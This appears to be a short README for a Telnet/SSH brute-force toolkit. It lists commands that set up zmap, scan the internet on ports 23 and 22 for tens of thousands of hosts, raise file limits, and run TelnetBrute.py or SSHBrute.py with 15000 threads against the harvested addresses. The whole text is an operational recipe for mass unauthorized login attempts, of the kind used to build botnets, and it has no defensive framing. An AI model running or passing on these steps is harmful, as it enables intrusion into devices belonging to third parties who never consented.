[VPS CentOS 6.9 2GB-RAM] 

- Install zmap

yum update -y 

sh zmap_auto_install.sh

- Scan Telnet/Ssh Ips

1- zmap -p23 -o mfutelnet.txt -N 25000    OR    zmap -p22 -o mfussh.txt -w -N 25000

   1,5--(optional)  zmap -p23 -o mfutelnet.txt -w telnet.lst   OR   zmap -p22 -o mfussh.txt -w ssh.lst

- Bruteforce 

2- ulimit -n 999999

3- python TelnetBrute.py mfutelnet.txt 15000 telnettest.txt    OR    python SSHBrute.py mfussh.txt 15000 sshtest.txt 




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



